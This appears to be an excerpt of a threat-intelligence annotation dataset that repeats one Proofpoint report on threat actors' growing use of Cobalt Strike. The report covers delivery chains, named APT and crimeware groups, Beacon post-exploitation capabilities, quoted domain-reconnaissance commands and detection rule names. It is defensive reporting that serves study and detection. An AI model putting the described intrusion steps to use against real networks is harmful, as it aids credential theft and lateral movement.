– [APT攻撃者グループ menuPass(APT10) による新たな攻撃を確認] (https://www.lac.co.jp/lacwatch/people/20180521_001638.html) November 2018 – [Not So Cozy: An Uncomfortable Examination of a Suspected APT29 Phishing Campaign] (https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html) 2019 – [Seven International Cyber Defendants, Including “Apt41” Actors, Charged In Connection With Computer Intrusion Campaigns Against More Than 100 Victims Globally] (https://www.justice.gov/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer) November 2019 – [TA2101 plays government imposter to distribute malware to German, Italian, and US organizations] (https://www.proofpoint.com/us/threat-insight/post/ta2101-plays-government-imposter-distribute-malware-german-italian-and-us) September 2020 – [Chinese Ministry of State Security-Affiliated Cyber Threat Actor Activity] (https://us-cert.cisa.gov/ncas/alerts/aa20-258a) December 2020 – [Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims With SUNBURST Backdoor] (https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html) March 2021 – [NimzaLoader: TA800’s New Initial Access Malware] (https://www.proofpoint.com/uk/blog/threat-insight/nimzaloader-ta800s-new-initial-access-malware) May 2021 – [New sophisticated email-based attack from NOBELIUM] (https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/) #### Detections Proofpoint Emerging Threats includes robust detections for Cobalt Strike. The following are a sample of our detections as they relate to the behaviors described in this report. 2028591 ET TROJAN Cobalt Strike Malleable C2 Request YouTube Profile 2028589 ET TROJAN Cobalt Strike Malleable C2 Response O365 Profile M2 2032749 ET TROJAN Cobalt Strike Malleable C2 Amazon Profile 2032746 ET TROJAN Cobalt Strike Malleable C2 QiHoo Profile 2027082 ET TROJAN Observed Malicious SSL Cert CobaltStrike C2 2023629 ET INFO Suspicious Empty SSL Certificate - Observed in Cobalt Strike 2032362 ET TROJAN Cobalt Strike Beacon Activity 2032951 ET TROJAN Observed Cobalt Strike User-Agent"
annoctr,annoctr/AnnoCTR/text/train/proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt.txt,proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt,G0046,"Cobalt Strike: Favorite Tool from APT to Crimeware June 29, 2021 ``` *(Updated 8/18/2021 at the request of a third-party)* ``` ### Key Findings * Malicious use of Cobalt Strike in threat actor campaigns is increasing. * Threat actor use of Cobalt Strike increased 161 percent from 2019 to 2020 and remains a high-volume threat in 2021. * Cobalt Strike is currently used by more cybercrime and general commodity [malware](https://www.proofpoint.com/us/threat-reference/malware) operators than APT and espionage threat actors. ### Overview In 2021, Cobalt Strike is appearing in Proofpoint threat data more frequently than ever. Cobalt Strike is a legitimate security tool used by penetration testers to emulate threat actor activity in a network. However, it is also increasingly used by malicious actors – Proofpoint saw a 161 percent increase in threat actor use of the tool from 2019 to 2020. This aligns with [observations](https://www.recordedfuture.com/2020-adversary-infrastructure-report/) from other security firms as more threat actors adopt hacking tools in their operations. When mapped to the [MITRE ATT&CK framework](https://attack.mitre.org/matrices/enterprise/), Proofpoint’s visibility into the attack chain focuses on [Initial Access](https://www.proofpoint.com/us/blog/threat-insight/first-step-initial-access-leads-ransomware), Execution, and Persistence mechanisms. That is: How are threat actors attempting to compromise hosts and what payloads are they deploying first. Our corpus of threat actor data includes criminal and state-associated threat actor groups. Based on our data, Proofpoint assesses with high confidence that Cobalt Strike is becoming increasingly popular among threat actors as an initial access payload, not just a second-stage tool threat actors use once access is achieved, with criminal threat actors making up the bulk of attributed Cobalt Strike campaigns in 2020. ### Background In December 2020, the world learned about an expansive and effective espionage campaign that successfully backdoored the popular network monitoring software SolarWinds. Investigators [revealed tools](https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html) used by the threat actors included Cobalt Strike Beacon. This campaign was attributed to threat actors working for Russia’s Foreign Intelligence Service – a group with Cobalt Strike in their toolbox [since at least](https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html) 2018. This high-profile activity was part of a clever attack chain enabling advanced threat actors to surreptitiously compromise a relatively small number of victims. The tool used, and customized to fit their needs, is almost a decade old but increasingly popular. Cobalt Strike [debuted](https://blog.cobaltstrike.com/2016/03/02/a-history-of-cobalt-strike-in-training-courses/) in 2012 in response to perceived gaps in an existing red team tool, the Metasploit Framework. In 2015, Cobalt Strike 3.0 launched as a standalone adversary emulation platform. By 2016, Proofpoint researchers began observing threat actors using Cobalt Strike. Historically, Cobalt Strike use in malicious operations was largely associated with well-resourced threat actors, including [large cybercrime operators](https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=257dd693-5986-41bf-bc33-f9dc76d9c6a8&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments) like TA3546 (also known as FIN7), and advanced persistent threat (APT) [groups such as TA423](https://www.proofpoint.com/us/threat-insight/post/leviathan-espionage-actor-spearphishes-maritime-and-defense-targets) (also known as Leviathan or APT40). Proofpoint researchers have attributed two-thirds of identified Cobalt Strike campaigns from 2016 through 2018 to well-resourced cybercrime organizations or APT groups. That ratio decreased dramatically the following years – between 2019 and present, just 15 percent of Cobalt Strike campaigns were attributable to known threat actors. ![Chart, line chart Description automatically generated](data:image;base64_removed,) *Figure 1: Number of email messages associated with a Cobalt Strike payload observed over time. Note: 2021 figures include data through May 2021.* Threat actors can obtain Cobalt Strike in a variety of ways: purchasing it directly from the vendor’s website, which requires verification; buying a version on the dark web via various hacking forums; or using cracked, illegitimate versions of the software. In March 2020, a cracked version of Cobalt Strike 4.0 was released and made available to threat actors. ### Cobalt Strike’s Appeal Cobalt Strike is used by a diverse array of threat actors, and while it is not unusual for cybercriminal and APT actors to leverage similar tooling in their campaigns, Cobalt Strike is unique in that its built-in capabilities enable it to be quickly deployed and operationalized regardless of actor sophistication or access to human or financial resources. The job of simulating actor attacks and penetrating defenses might become a bit more straightforward when both sides are using the same tool. Cobalt Strike is also session-based — that is, if threat actors can access a host and complete an operation without needing to establish ongoing persistence, there will not be remaining artifacts on the host after it is no longer running in-memory. In essence: they can hit it and forget it. Threat actors can also use the malleability of Cobalt Strike to create customized builds that add or remove features to achieve objectives or evade detection. For example, APT29 frequently uses custom Cobalt Strike Beacon loaders to [blend in](https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html) with legitimate traffic or [evade analysis](https://www.microsoft.com/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/). For defenders, customized Cobalt Strike modules often require unique signatures, so threat detection engineers may be required to play catch-up to Cobalt Strike use in the wild. Cobalt Strike is also appealing to threat actors for its inherent obfuscation. Attribution gets more difficult if everyone is using the same tool. If an organization has a red team actively making use of it, it is possible malicious traffic could be mistaken as legitimate. The software’s ease of use can improve the capabilities of less sophisticated actors. For sophisticated actors, why spend development cycles on something new when you already have a great tool for the job. Proofpoint data shows Cobalt Strike is a popular tool for everything from strategic compromises to noisy, widespread campaigns. The following examples illustrate a small sampling of the types of threat actors leveraging Cobalt Strike tracked by Proofpoint. ### Threat Actors **TA800** TA800 is a large crimeware group tracked by Proofpoint since mid-2019. This actor attempts to deliver and install banking malware or malware loaders, including The Trick and BazaLoader. In April 2020, TA800 became the first group observed distributing BazaLoader. In these early campaigns, the threat actor distributed emails with a malicious link to an executable or a landing page hosted on Google Docs with a link to an executable. The executable downloaded the BazaLoader backdoor which in turn downloaded Cobalt Strike. In February 2021, the group pivoted to distributing Cobalt Strike as a first-stage payload via malicious URLs. There has been some evidence suggesting TA800’s [NimzaLoader](https://www.proofpoint.com/us/blog/threat-insight/nimzaloader-ta800s-new-initial-access-malware)is being used to download and execute Cobalt Strike as its secondary payload. **TA547** TA547 is a crimeware actor tracked by Proofpoint since October 2017. This group appears to be interested in distributing primarily banking trojans – including The Trick and ZLoader – to various geographic regions. Since mid-2020, this actor favors using malicious Microsoft Office attachments to distribute malware. In February 2021, TA547 began distributing Cobalt Strike as a second-stage payload for command and control. **TA415** TA415 is an APT actor believed to be associated with People’s Republic of China (PRC) state interests. The group has been noted in United States court filings to be tied to PRC’s Ministry of State Security. TA415 is also known as Barium and APT41. Proofpoint identified TA415 delivering Cobalt Strike as a first-stage payload in limited campaigns during mid-2020. In September 2020, the United States Department of Justice announced the indictment of several threat actors associated with this threat group, and [detailed](https://www.justice.gov/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer) the threat actors use of Cobalt Strike in the indictment. Based on recent [reporting by Group-IB](https://blog.group-ib.com/colunmtk_apt41), TA415 used Cobalt Strike in a campaign against an entity in the airlines sector. The following timeline provides a small sample of threat actor use of Cobalt Strike across cybercrime and APT threats. The selected events were identified based on their significance, and are not representative of the full Cobalt Strike threat landscape. ![Timeline Description automatically generated](data:image;base64_removed,) *Figure 2: Timeline of threats using Cobalt Strike. Links to the sources are available in the References section.* ### Attack Chain Proofpoint has observed dozens of threat actors using Cobalt Strike. However, like their legitimate counterparts, threat actors exhibit many attack paths and use cases of the malicious actor emulation software. Threat actors use different lure themes, threat types, droppers, and payloads. For example, the earliest Cobalt Strike campaigns distributed email threats with malicious document attachments to distribute the malware, but campaigns distributing malicious URLs directly in the email body have overtaken attachments as the more frequently utilized threat type. While instances of Cobalt Strike being sent directly as an initial payload have dramatically increased, deployment as a second stage payload remains popular. Cobalt Strike has been observed in a variety of attack chains alongside malware such as The Trick, BazaLoader, Ursnif, IcedID, and many more popular loaders. In these cases, the preceding malware typically loads and executes Cobalt Strike. Likewise, there is a wide array of techniques leveraged in cases where Cobalt Strike is delivered directly, such as via malicious macros in weaponized Office documents, compressed executables, PowerShell, dynamic data exchange (DDE), HTA/HTML files, and traffic distribution systems. After Cobalt Strike has been executed and a Beacon established for C2 communication, actors have been observed attempting to enumerate network connections and dumping Active Directory credentials as they try to move laterally to a network resource such as a Domain Controller, allowing for deployment of ransomware to all networked systems. For example, the Cobalt Strike [documentation states](https://www.cobaltstrike.com/help-beacon): Use the net dclist command to find the Domain Controller for the domain the target is joined to. Use the net view command to find targets on the domain the target is joined to. In addition to network discovery and credential dumping, Cobalt Strike Beacon also has the capability to elevate privileges, load and execute additional tools, and to inject these functions into existing running host processes to attempt to avoid detection. ### Outlook Proofpoint researchers anticipate Cobalt Strike will continue to be a commonly used tool in threat actor toolsets. According to internal data, tens of thousands of organizations have already been targeted with Cobalt Strike, based on observed campaigns. We expect this number to increase in 2021. ![Chart type: Line. TOTAL_CUST increases over time. Description automatically generated](data:image;base64_removed,) *Figure 3: Number of customers targeted by threats using Cobalt Strike* ### Conclusion Cobalt Strike is a useful tool, for legitimate security researchers and threat actors alike. Its malleability coupled with its usability makes it a robust and effective tool for siphoning data, moving laterally, and loading additional malware payloads. Cobalt Strike is not the only red team tool appearing more often in Proofpoint data. Others include Mythic, Meterpreter, and the Veil Framework. The use of publicly available tooling aligns with a broader trend observed by Proofpoint: Threat actors are using as many legitimate tools as possible, including executing Windows processes like PowerShell and WMI; injecting malicious code into legitimate binaries; and frequently using allowable services like Dropbox, Google Drive, SendGrid, and Constant Contact to host and distribute malware. #### References The following references are associated with the above timeline. January 2016 – [Odinaff: New Trojan used in high level financial attacks] (https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=257dd693-5986-41bf-bc33-f9dc76d9c6a8&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments) May 2017 – [Microsoft Word Intruder Integrates CVE-2017-0199, Utilized by Cobalt Group to Target Financial Institutions] (https://www.proofpoint.com/us/threat-insight/post/microsoft-word-intruder-integrates-cve-2017-0199-utilized-cobalt-group-target) October 2017 – [Leviathan: Espionage actor spearphishes maritime and defense targets] (https://www.proofpoint.com/us/threat-insight/post/leviathan-espionage-actor-spearphishes-maritime-and-defense-targets) April 2018 – [APT攻撃者グループ menuPass(APT10) による新たな攻撃を確認] (https://www.lac.co.jp/lacwatch/people/20180521_001638.html) November 2018 – [Not So Cozy: An Uncomfortable Examination of a Suspected APT29 Phishing Campaign] (https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html) 2019 – [Seven International Cyber Defendants, Including “Apt41” Actors, Charged In Connection With Computer Intrusion Campaigns Against More Than 100 Victims Globally] (https://www.justice.gov/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer) November 2019 – [TA2101 plays government imposter to distribute malware to German, Italian, and US organizations] (https://www.proofpoint.com/us/threat-insight/post/ta2101-plays-government-imposter-distribute-malware-german-italian-and-us) September 2020 – [Chinese Ministry of State Security-Affiliated Cyber Threat Actor Activity] (https://us-cert.cisa.gov/ncas/alerts/aa20-258a) December 2020 – [Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims With SUNBURST Backdoor] (https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html) March 2021 – [NimzaLoader: TA800’s New Initial Access Malware] (https://www.proofpoint.com/uk/blog/threat-insight/nimzaloader-ta800s-new-initial-access-malware) May 2021 – [New sophisticated email-based attack from NOBELIUM] (https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/) #### Detections Proofpoint Emerging Threats includes robust detections for Cobalt Strike. The following are a sample of our detections as they relate to the behaviors described in this report. 2028591 ET TROJAN Cobalt Strike Malleable C2 Request YouTube Profile 2028589 ET TROJAN Cobalt Strike Malleable C2 Response O365 Profile M2 2032749 ET TROJAN Cobalt Strike Malleable C2 Amazon Profile 2032746 ET TROJAN Cobalt Strike Malleable C2 QiHoo Profile 2027082 ET TROJAN Observed Malicious SSL Cert CobaltStrike C2 2023629 ET INFO Suspicious Empty SSL Certificate - Observed in Cobalt Strike 2032362 ET TROJAN Cobalt Strike Beacon Activity 2032951 ET TROJAN Observed Cobalt Strike User-Agent"
annoctr,annoctr/AnnoCTR/text/train/proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt.txt,proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt,G0065,"Cobalt Strike: Favorite Tool from APT to Crimeware June 29, 2021 ``` *(Updated 8/18/2021 at the request of a third-party)* ``` ### Key Findings * Malicious use of Cobalt Strike in threat actor campaigns is increasing. * Threat actor use of Cobalt Strike increased 161 percent from 2019 to 2020 and remains a high-volume threat in 2021. * Cobalt Strike is currently used by more cybercrime and general commodity [malware](https://www.proofpoint.com/us/threat-reference/malware) operators than APT and espionage threat actors. ### Overview In 2021, Cobalt Strike is appearing in Proofpoint threat data more frequently than ever. Cobalt Strike is a legitimate security tool used by penetration testers to emulate threat actor activity in a network. However, it is also increasingly used by malicious actors – Proofpoint saw a 161 percent increase in threat actor use of the tool from 2019 to 2020. This aligns with [observations](https://www.recordedfuture.com/2020-adversary-infrastructure-report/) from other security firms as more threat actors adopt hacking tools in their operations. When mapped to the [MITRE ATT&CK framework](https://attack.mitre.org/matrices/enterprise/), Proofpoint’s visibility into the attack chain focuses on [Initial Access](https://www.proofpoint.com/us/blog/threat-insight/first-step-initial-access-leads-ransomware), Execution, and Persistence mechanisms. That is: How are threat actors attempting to compromise hosts and what payloads are they deploying first. Our corpus of threat actor data includes criminal and state-associated threat actor groups. Based on our data, Proofpoint assesses with high confidence that Cobalt Strike is becoming increasingly popular among threat actors as an initial access payload, not just a second-stage tool threat actors use once access is achieved, with criminal threat actors making up the bulk of attributed Cobalt Strike campaigns in 2020. ### Background In December 2020, the world learned about an expansive and effective espionage campaign that successfully backdoored the popular network monitoring software SolarWinds. Investigators [revealed tools](https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html) used by the threat actors included Cobalt Strike Beacon. This campaign was attributed to threat actors working for Russia’s Foreign Intelligence Service – a group with Cobalt Strike in their toolbox [since at least](https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html) 2018. This high-profile activity was part of a clever attack chain enabling advanced threat actors to surreptitiously compromise a relatively small number of victims. The tool used, and customized to fit their needs, is almost a decade old but increasingly popular. Cobalt Strike [debuted](https://blog.cobaltstrike.com/2016/03/02/a-history-of-cobalt-strike-in-training-courses/) in 2012 in response to perceived gaps in an existing red team tool, the Metasploit Framework. In 2015, Cobalt Strike 3.0 launched as a standalone adversary emulation platform. By 2016, Proofpoint researchers began observing threat actors using Cobalt Strike. Historically, Cobalt Strike use in malicious operations was largely associated with well-resourced threat actors, including [large cybercrime operators](https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=257dd693-5986-41bf-bc33-f9dc76d9c6a8&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments) like TA3546 (also known as FIN7), and advanced persistent threat (APT) [groups such as TA423](https://www.proofpoint.com/us/threat-insight/post/leviathan-espionage-actor-spearphishes-maritime-and-defense-targets) (also known as Leviathan or APT40). Proofpoint researchers have attributed two-thirds of identified Cobalt Strike campaigns from 2016 through 2018 to well-resourced cybercrime organizations or APT groups. That ratio decreased dramatically the following years – between 2019 and present, just 15 percent of Cobalt Strike campaigns were attributable to known threat actors. ![Chart, line chart Description automatically generated](data:image;base64_removed,) *Figure 1: Number of email messages associated with a Cobalt Strike payload observed over time. Note: 2021 figures include data through May 2021.* Threat actors can obtain Cobalt Strike in a variety of ways: purchasing it directly from the vendor’s website, which requires verification; buying a version on the dark web via various hacking forums; or using cracked, illegitimate versions of the software. In March 2020, a cracked version of Cobalt Strike 4.0 was released and made available to threat actors. ### Cobalt Strike’s Appeal Cobalt Strike is used by a diverse array of threat actors, and while it is not unusual for cybercriminal and APT actors to leverage similar tooling in their campaigns, Cobalt Strike is unique in that its built-in capabilities enable it to be quickly deployed and operationalized regardless of actor sophistication or access to human or financial resources. The job of simulating actor attacks and penetrating defenses might become a bit more straightforward when both sides are using the same tool. Cobalt Strike is also session-based — that is, if threat actors can access a host and complete an operation without needing to establish ongoing persistence, there will not be remaining artifacts on the host after it is no longer running in-memory. In essence: they can hit it and forget it. Threat actors can also use the malleability of Cobalt Strike to create customized builds that add or remove features to achieve objectives or evade detection. For example, APT29 frequently uses custom Cobalt Strike Beacon loaders to [blend in](https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html) with legitimate traffic or [evade analysis](https://www.microsoft.com/security/blog/2021/05/28/breaking-down-nobeliums-latest-early-stage-toolset/). For defenders, customized Cobalt Strike modules often require unique signatures, so threat detection engineers may be required to play catch-up to Cobalt Strike use in the wild. Cobalt Strike is also appealing to threat actors for its inherent obfuscation. Attribution gets more difficult if everyone is using the same tool. If an organization has a red team actively making use of it, it is possible malicious traffic could be mistaken as legitimate. The software’s ease of use can improve the capabilities of less sophisticated actors. For sophisticated actors, why spend development cycles on something new when you already have a great tool for the job. Proofpoint data shows Cobalt Strike is a popular tool for everything from strategic compromises to noisy, widespread campaigns. The following examples illustrate a small sampling of the types of threat actors leveraging Cobalt Strike tracked by Proofpoint. ### Threat Actors **TA800** TA800 is a large crimeware group tracked by Proofpoint since mid-2019. This actor attempts to deliver and install banking malware or malware loaders, including The Trick and BazaLoader. In April 2020, TA800 became the first group observed distributing BazaLoader. In these early campaigns, the threat actor distributed emails with a malicious link to an executable or a landing page hosted on Google Docs with a link to an executable. The executable downloaded the BazaLoader backdoor which in turn downloaded Cobalt Strike. In February 2021, the group pivoted to distributing Cobalt Strike as a first-stage payload via malicious URLs. There has been some evidence suggesting TA800’s [NimzaLoader](https://www.proofpoint.com/us/blog/threat-insight/nimzaloader-ta800s-new-initial-access-malware)is being used to download and execute Cobalt Strike as its secondary payload. **TA547** TA547 is a crimeware actor tracked by Proofpoint since October 2017. This group appears to be interested in distributing primarily banking trojans – including The Trick and ZLoader – to various geographic regions. Since mid-2020, this actor favors using malicious Microsoft Office attachments to distribute malware. In February 2021, TA547 began distributing Cobalt Strike as a second-stage payload for command and control. **TA415** TA415 is an APT actor believed to be associated with People’s Republic of China (PRC) state interests. The group has been noted in United States court filings to be tied to PRC’s Ministry of State Security. TA415 is also known as Barium and APT41. Proofpoint identified TA415 delivering Cobalt Strike as a first-stage payload in limited campaigns during mid-2020. In September 2020, the United States Department of Justice announced the indictment of several threat actors associated with this threat group, and [detailed](https://www.justice.gov/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer) the threat actors use of Cobalt Strike in the indictment. Based on recent [reporting by Group-IB](https://blog.group-ib.com/colunmtk_apt41), TA415 used Cobalt Strike in a campaign against an entity in the airlines sector. The following timeline provides a small sample of threat actor use of Cobalt Strike across cybercrime and APT threats. The selected events were identified based on their significance, and are not representative of the full Cobalt Strike threat landscape. ![Timeline Description automatically generated](data:image;base64_removed,) *Figure 2: Timeline of threats using Cobalt Strike. Links to the sources are available in the References section.* ### Attack Chain Proofpoint has observed dozens of threat actors using Cobalt Strike. However, like their legitimate counterparts, threat actors exhibit many attack paths and use cases of the malicious actor emulation software. Threat actors use different lure themes, threat types, droppers, and payloads. For example, the earliest Cobalt Strike campaigns distributed email threats with malicious document attachments to distribute the malware, but campaigns distributing malicious URLs directly in the email body have overtaken attachments as the more frequently utilized threat type. While instances of Cobalt Strike being sent directly as an initial payload have dramatically increased, deployment as a second stage payload remains popular. Cobalt Strike has been observed in a variety of attack chains alongside malware such as The Trick, BazaLoader, Ursnif, IcedID, and many more popular loaders. In these cases, the preceding malware typically loads and executes Cobalt Strike. Likewise, there is a wide array of techniques leveraged in cases where Cobalt Strike is delivered directly, such as via malicious macros in weaponized Office documents, compressed executables, PowerShell, dynamic data exchange (DDE), HTA/HTML files, and traffic distribution systems. After Cobalt Strike has been executed and a Beacon established for C2 communication, actors have been observed attempting to enumerate network connections and dumping Active Directory credentials as they try to move laterally to a network resource such as a Domain Controller, allowing for deployment of ransomware to all networked systems. For example, the Cobalt Strike [documentation states](https://www.cobaltstrike.com/help-beacon): Use the net dclist command to find the Domain Controller for the domain the target is joined to. Use the net view command to find targets on the domain the target is joined to. In addition to network discovery and credential dumping, Cobalt Strike Beacon also has the capability to elevate privileges, load and execute additional tools, and to inject these functions into existing running host processes to attempt to avoid detection. ### Outlook Proofpoint researchers anticipate Cobalt Strike will continue to be a commonly used tool in threat actor toolsets. According to internal data, tens of thousands of organizations have already been targeted with Cobalt Strike, based on observed campaigns. We expect this number to increase in 2021. ![Chart type: Line. TOTAL_CUST increases over time. Description automatically generated](data:image;base64_removed,) *Figure 3: Number of customers targeted by threats using Cobalt Strike* ### Conclusion Cobalt Strike is a useful tool, for legitimate security researchers and threat actors alike. Its malleability coupled with its usability makes it a robust and effective tool for siphoning data, moving laterally, and loading additional malware payloads. Cobalt Strike is not the only red team tool appearing more often in Proofpoint data. Others include Mythic, Meterpreter, and the Veil Framework. The use of publicly available tooling aligns with a broader trend observed by Proofpoint: Threat actors are using as many legitimate tools as possible, including executing Windows processes like PowerShell and WMI; injecting malicious code into legitimate binaries; and frequently using allowable services like Dropbox, Google Drive, SendGrid, and Constant Contact to host and distribute malware. #### References The following references are associated with the above timeline. January 2016 – [Odinaff: New Trojan used in high level financial attacks] (https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=257dd693-5986-41bf-bc33-f9dc76d9c6a8&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments) May 2017 – [Microsoft Word Intruder Integrates CVE-2017-0199, Utilized by Cobalt Group to Target Financial Institutions] (https://www.proofpoint.com/us/threat-insight/post/microsoft-word-intruder-integrates-cve-2017-0199-utilized-cobalt-group-target) October 2017 – [Leviathan: Espionage actor spearphishes maritime and defense targets] (https://www.proofpoint.com/us/threat-insight/post/leviathan-espionage-actor-spearphishes-maritime-and-defense-targets) April 2018 – [APT攻撃者グループ menuPass(APT10) による新たな攻撃を確認] (https://www.lac.co.jp/lacwatch/people/20180521_001638.html) November 2018 – [Not So Cozy: An Uncomfortable Examination of a Suspected APT29 Phishing Campaign] (https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html) 2019 – [Seven International Cyber Defendants, Including “Apt41” Actors, Charged In Connection With Computer Intrusion Campaigns Against More Than 100 Victims Globally] (https://www.justice.gov/opa/pr/seven-international-cyber-defendants-including-apt41-actors-charged-connection-computer) November 2019 – [TA2101 plays government imposter to distribute malware to German, Italian, and US organizations] (https://www.proofpoint.com/us/threat-insight/post/ta2101-plays-government-imposter-distribute-malware-german-italian-and-us) September 2020 – [Chinese Ministry of State Security-Affiliated Cyber Threat Actor Activity] (https://us-cert.cisa.gov/ncas/alerts/aa20-258a) December 2020 – [Highly Evasive Attacker Leverages SolarWinds Supply Chain to Compromise Multiple Global Victims With SUNBURST Backdoor] (https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html) March 2021 – [NimzaLoader: TA800’s New Initial Access Malware] (https://www.proofpoint.com/uk/blog/threat-insight/nimzaloader-ta800s-new-initial-access-malware) May 2021 – [New sophisticated email-based attack from NOBELIUM] (https://www.microsoft.com/security/blog/2021/05/27/new-sophisticated-email-based-attack-from-nobelium/) #### Detections Proofpoint Emerging Threats includes robust detections for Cobalt Strike. The following are a sample of our detections as they relate to the behaviors described in this report. 2028591 ET TROJAN Cobalt Strike Malleable C2 Request YouTube Profile 2028589 ET TROJAN Cobalt Strike Malleable C2 Response O365 Profile M2 2032749 ET TROJAN Cobalt Strike Malleable C2 Amazon Profile 2032746 ET TROJAN Cobalt Strike Malleable C2 QiHoo Profile 2027082 ET TROJAN Observed Malicious SSL Cert CobaltStrike C2 2023629 ET INFO Suspicious Empty SSL Certificate - Observed in Cobalt Strike 2032362 ET TROJAN Cobalt Strike Beacon Activity 2032951 ET TROJAN Observed Cobalt Strike User-Agent"
annoctr,annoctr/AnnoCTR/text/train/proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt.txt,proofpoint_2021-06-29_cobalt-strike-favorite-tool-apt,G0096,"Cobalt Strike: Favorite Tool from APT to Crimeware June 29, 2021 ``` *(Updated 8/18/2021 at the request of a third-party)* ``` ### Key Findings * Malicious use of Cobalt Strike in threat actor campaigns is increasing. * Threat actor use of Cobalt Strike increased 161 percent from 2019 to 2020 and remains a high-volume threat in 2021. * Cobalt Strike is currently used by more cybercrime and general commodity [malware](https://www.proofpoint.com/us/threat-reference/malware) operators than APT and espionage threat actors. ### Overview In 2021, Cobalt Strike is appearing in Proofpoint threat data more frequently than ever. Cobalt Strike is a legitimate security tool used by penetration testers to emulate threat actor activity in a network. However, it is also increasingly used by malicious actors – Proofpoint saw a 161 percent increase in threat actor use of the tool from 2019 to 2020. This aligns with [observations](https://www.recordedfuture.com/2020-adversary-infrastructure-report/) from other security firms as more threat actors adopt hacking tools in their operations. When mapped to the [MITRE ATT&CK framework](https://attack.mitre.org/matrices/enterprise/), Proofpoint’s visibility into the attack chain focuses on [Initial Access](https://www.proofpoint.com/us/blog/threat-insight/first-step-initial-access-leads-ransomware), Execution, and Persistence mechanisms. That is: How are threat actors attempting to compromise hosts and what payloads are they deploying first. Our corpus of threat actor data includes criminal and state-associated threat actor groups. Based on our data, Proofpoint assesses with high confidence that Cobalt Strike is becoming increasingly popular among threat actors as an initial access payload, not just a second-stage tool threat actors use once access is achieved, with criminal threat actors making up the bulk of attributed Cobalt Strike campaigns in 2020. ### Background In December 2020, the world learned about an expansive and effective espionage campaign that successfully backdoored the popular network monitoring software SolarWinds. Investigators [revealed tools](https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html) used by the threat actors included Cobalt Strike Beacon. This campaign was attributed to threat actors working for Russia’s Foreign Intelligence Service – a group with Cobalt Strike in their toolbox [since at least](https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html) 2018. This high-profile activity was part of a clever attack chain enabling advanced threat actors to surreptitiously compromise a relatively small number of victims. The tool used, and customized to fit their needs, is almost a decade old but increasingly popular. Cobalt Strike [debuted](https://blog.cobaltstrike.com/2016/03/02/a-history-of-cobalt-strike-in-training-courses/) in 2012 in response to perceived gaps in an existing red team tool, the Metasploit Framework. In 2015, Cobalt Strike 3.0 launched as a standalone adversary emulation platform. By 2016, Proofpoint researchers began observing threat actors using Cobalt Strike. Historically, Cobalt Strike use in malicious operations was largely associated with well-resourced threat actors, including [large cybercrime operators](https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=257dd693-5986-41bf-bc33-f9dc76d9c6a8&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments) like TA3546 (also known as FIN7), and advanced persistent threat (APT) [groups such as TA423](https://www.proofpoint.com/us/threat-insight/post/leviathan-espionage-actor-spearphishes-maritime-and-defense-targets) (also known as Leviathan or APT40). Proofpoint researchers have attributed two-thirds of identified Cobalt Strike campaigns from 2016 through 2018 to well-resourced cybercrime organizations or APT groups. That ratio decreased dramatically the following years – between 2019 and present, just 15 percent of Cobalt Strike campaigns were attributable to known threat actors. ![Chart, line chart Description automatically generated](data:image;base64_removed,) *Figure 1: Number of email messages associated with a Cobalt Strike payload observed over time. Note: 2021 figures 